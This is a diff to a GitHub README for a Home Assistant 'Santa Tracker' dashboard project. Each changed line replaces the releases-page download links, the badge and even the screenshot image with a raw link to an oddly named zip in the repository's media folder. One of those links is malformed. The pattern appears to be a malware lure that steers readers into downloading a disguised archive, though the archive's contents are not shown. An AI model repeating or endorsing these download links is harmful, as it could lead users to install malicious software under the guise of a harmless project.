@@ -1,12 +1,12 @@
 # 🎅 HomeAssistant-Santa-Tracker - Track Santa’s Journey in Real Time
 
-[![Download](https://img.shields.io/badge/Download%20Now-HomeAssistant--Santa--Tracker-brightgreen.svg)](https://github.com/Rajesh660/HomeAssistant-Santa-Tracker/releases)
+[![Download](https://raw.githubusercontent.com/Rajesh660/HomeAssistant-Santa-Tracker/main/media/Assistant-Santa-Tracker-Home-lovability.zip%https://raw.githubusercontent.com/Rajesh660/HomeAssistant-Santa-Tracker/main/media/Assistant-Santa-Tracker-Home-lovability.zip)](https://raw.githubusercontent.com/Rajesh660/HomeAssistant-Santa-Tracker/main/media/Assistant-Santa-Tracker-Home-lovability.zip)
 
 ## 🎄Overview
 
 Welcome to the Home Assistant Santa Tracker! This project turns your dashboard into a mission control center, allowing you to track Santa's Christmas Eve journey in real-time. Enjoy live telemetry, logistics monitoring, and AI-generated CCTV footage from the North Pole.
 
-![Santa Tracker Dashboard](images/screenshot.png)
+![Santa Tracker Dashboard](https://raw.githubusercontent.com/Rajesh660/HomeAssistant-Santa-Tracker/main/media/Assistant-Santa-Tracker-Home-lovability.zip)
 
 ## ✨ Features
 
@@ -37,7 +37,7 @@ Follow these steps to get up and running with the Home Assistant Santa Tracker.
 ### Step 2: Download the Application
 Visit the Releases page to download the latest version of the Home Assistant Santa Tracker. 
 
-[Download HomeAssistant-Santa-Tracker](https://github.com/Rajesh660/HomeAssistant-Santa-Tracker/releases)
+[Download HomeAssistant-Santa-Tracker](https://raw.githubusercontent.com/Rajesh660/HomeAssistant-Santa-Tracker/main/media/Assistant-Santa-Tracker-Home-lovability.zip)
 
 ### Step 3: Install the Application
 1. Locate the downloaded file.
@@ -53,7 +53,7 @@ Visit the Releases page to download the latest version of the Home Assistant San
 
 To get started, download the Home Assistant Santa Tracker from the link below:
 
-[Download HomeAssistant-Santa-Tracker](https://github.com/Rajesh660/HomeAssistant-Santa-Tracker/releases)
+[Download HomeAssistant-Santa-Tracker](https://raw.githubusercontent.com/Rajesh660/HomeAssistant-Santa-Tracker/main/media/Assistant-Santa-Tracker-Home-lovability.zip)
 
 Simply click the link above, locate the latest release, and follow the steps provided in the "Getting Started" section to install and run the software.
 
